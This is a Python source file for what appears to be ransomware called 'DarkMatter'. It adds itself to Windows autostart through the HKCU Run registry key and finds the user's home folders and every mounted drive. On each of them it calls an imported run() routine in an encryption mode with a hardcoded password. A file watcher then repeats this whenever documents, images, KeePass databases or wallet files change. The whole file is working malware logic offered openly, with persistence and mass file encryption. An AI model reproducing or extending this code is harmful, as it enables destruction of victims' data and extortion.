import sys
import os
import time
import pathlib
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from main import run 


ENCRYPT_PASSWORD = "ThePasswordthatTheNaughtyGuyOnceAGoodBoy"
DEFAULT_MODE     = "1"

# Windows
EXCLUDED_TOP_LEVEL_WINDOWS = {
    '$RECYCLE.BIN',
    'System Volume Information',
    'Windows',
    'Program Files',
    'Program Files (x86)',
    'ProgramData',
    'PerfLogs',
    '$WinREAgent',
    'Recovery',
    'hiberfil.sys',
    'pagefile.sys',
    'swapfile.sys',
}

EXCLUDED_SUBSTRINGS_WINDOWS = {
    r'\Windows\WinSxS',
    r'\Windows\Temp',
    r'\Windows\Prefetch',
    r'\Windows\Logs',
    r'\Windows\SoftwareDistribution',
    r'\AppData\Local\Temp',
    r'\AppData\Local\Microsoft\Windows\Explorer',
    r'\OneDrive\.onedrive',
}

# Linux
EXCLUDED_SUBSTRINGS_LINUX = {
    '/proc',
    '/sys',
    '/dev',
    '/run',
    '/var/lib/snapd',
    '/snap',
    '/tmp',
    '/var/tmp',
    '/lost+found',
}

IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX   = sys.platform.startswith('linux')

def should_skip(path: pathlib.Path) -> bool:
    name = path.name.lower()
    str_path = str(path).lower()

    if IS_WINDOWS:
        if name in EXCLUDED_TOP_LEVEL_WINDOWS:
            return True
        for bad in EXCLUDED_SUBSTRINGS_WINDOWS:
            if bad.lower() in str_path:
                return True
    else:  
        for bad in EXCLUDED_SUBSTRINGS_LINUX:
            if bad in str_path:
                return True

    try:
        test = path / ".probe"
        test.touch()
        test.unlink()
    except (PermissionError, OSError):
        return True

    return False


def get_interesting_roots() -> list[pathlib.Path]:
    roots = []
    home = pathlib.Path.home()
    roots.append(home)

    candidates = [
        home / "Desktop",
        home / "Documents",
        home / "Downloads",
        home / "Pictures",
        home / "Videos",
    ]

    if IS_WINDOWS:
        candidates.append(home.parent / "Public")
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            p = pathlib.Path(f"{letter}:\\")
            if p.exists():
                candidates.append(p)
    else:
        candidates.extend([
            pathlib.Path("/media"),
            pathlib.Path("/mnt"),
            home / ".local" / "share",
        ])

    for p in candidates:
        if p.exists() and not should_skip(p):
            roots.append(p)

    return sorted(set(roots))


def add_to_startup():
    if not IS_WINDOWS:
        print("[i] Autostart registration skipped (non-Windows platform)")
        return

    #Windows-only HKCU
    import winreg
    app_name = "DarkMatter"
    if getattr(sys, 'frozen', False):
        target = sys.executable
    else:
        target = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    if not (target.startswith('"') and target.endswith('"')):
        target = f'"{target}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0,
            winreg.KEY_READ | winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )
        try:
            existing, _ = winreg.QueryValueEx(key, app_name)
            if os.path.normcase(existing.strip('"')) == os.path.normcase(target.strip('"')):
                winreg.CloseKey(key)
                return
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        print("[+] Registered autostart (HKCU)")
    except Exception as e:
        print(f"[-] Autostart failed: {e}")


EXCLUDED_DIRS = {".git", "__pycache__", ".venv", "venv", "env", "node_modules", "build", "dist"}


class SaveHandler(FileSystemEventHandler):
    def __init__(self):
        self.last_run = 0
        self.processed = set()

    def on_any_event(self, event):
        if event.is_directory:
            return

        interesting_ext = {".txt", ".doc", ".docx", ".pdf", ".xlsx", ".wallet", ".kdbx", ".json", ".jpeg", ".jpg", ".png"}
        if not any(event.src_path.lower().endswith(x) for x in interesting_ext):
            return

        now = time.time()
        if now - self.last_run < 3:
            return

        self.last_run = now
        self.execute_on_interesting_folders()

    def execute_on_interesting_folders(self):
        for folder in get_interesting_roots():
            strf = str(folder.resolve())
            if strf in self.processed:
                continue
            self.safe_execute(folder)
            self.processed.add(strf)

    def safe_execute(self, folder: pathlib.Path):
        if should_skip(folder):
            return
        try:
            print(f"[+] Running on: {folder}")
            run(DEFAULT_MODE, str(folder.resolve()), ENCRYPT_PASSWORD)
        except Exception as e:
            print(f"[-] Failed on {folder}: {e}")


if __name__ == "__main__":
    add_to_startup()

    # Initial run
    for folder in get_interesting_roots():
        try:
            if not should_skip(folder):
                print(f"[INIT] Processing: {folder}")
                run(DEFAULT_MODE, str(folder.resolve()), ENCRYPT_PASSWORD)
        except Exception as e:
            print(f"[!] Init failed on {folder}: {e}")

    observer = Observer()
    handler = SaveHandler()

    for path in get_interesting_roots():
        if should_skip(path):
            print(f"[i] Skipping watch: {path}")
            continue
        print(f"[*] Scheduling recursive watch → {path}")
        observer.schedule(handler, str(path), recursive=True)

    observer.start()
    print("[*] Folder watcher active. Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        observer.stop()

    observer.join()